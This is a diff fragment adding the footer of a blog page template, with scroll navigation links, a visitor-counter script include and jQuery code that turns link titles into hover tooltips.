+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
